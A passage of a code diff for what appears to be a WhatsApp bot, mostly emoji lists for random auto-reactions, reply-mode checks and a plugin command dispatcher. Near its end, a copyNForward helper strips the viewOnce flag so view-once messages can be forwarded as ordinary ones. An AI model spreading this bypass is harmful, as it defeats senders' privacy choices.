'🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
+  
+          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
+          m.react(randomReaction);
+      }
+  }
+  
+  // Owner React
+  if (!isReact && senderNumber === botNumber) {
+      if (config.OWNER_REACT === 'true') {
+          const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
+          const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
+          m.react(randomOwnerReaction);
+      }
+  }
+          
+  //======HEART REACTIONS =======
+  //=======HRT React 
+  if (!isReact && senderNumber !== botNumber) {
+      if (config.HEART_REACT === 'true') {
+              const reactions = ['💘', '💝', '💖', '💗', '💓', '💞', '💕', '❣️', '❤️‍🔥', '❤️‍🩹', '❤️', '🩷', '🧡', '💛', '💚', '💙', '🩵', '💜', '🤎', '🖤', '🩶', '🤍'];
+             const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
+          m.react(randomReaction);
+      }
+  }
+  //=======HEART React 
+  if (!isReact && senderNumber === botNumber) {
+      if (config.HEART_REACT === 'true') {
+              const reactions = ['💘', '💝', '💖', '💗', '💓', '💞', '💕', '❣️', '❤️‍🔥', '❤️‍🩹', '❤️', '🩷', '🧡', '💛', '💚', '💙', '🩵', '💜', '🤎', '🖤', '🩶', '🤍'];
+             const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
+          m.react(randomReaction);
+      }
+  }        
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
+  // take commands 
+                 
+  const events = require('./command')
+  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+  if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+  
+  try {
+  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+  } catch (e) {
+  console.error("[PLUGIN ERROR] " + e);
+  }
+  }
+  }
+  events.commands.map(async(command) => {
+  if (body && command.on === "body") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (mek.q && command.on === "text") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  (command.on === "image" || command.on === "photo") &&
+  mek.type === "imageMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  command.on === "sticker" &&
+  mek.type === "stickerMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  }});
+  
+  });
+    //===================================================   
+    conn.decodeJid = jid => {
+      if (!jid) return jid;
+      if (/:\d+@/gi.test(jid)) {
+        let decode = jidDecode(jid) || {};
+        return (
+          (decode.user &&
+            decode.server &&
+            decode.user + '@' + decode.server) ||
+          jid
+        );
+      } else return jid;
+    };
+    //===================================================
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+      let vtype
+      if (options.readViewOnce) {
+          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+          delete message.message.viewOnceMessage.message[vtype].viewOnce
+          message.message = {
+              ...message.message.viewOnceMessage.message
+          }
+      }
+    
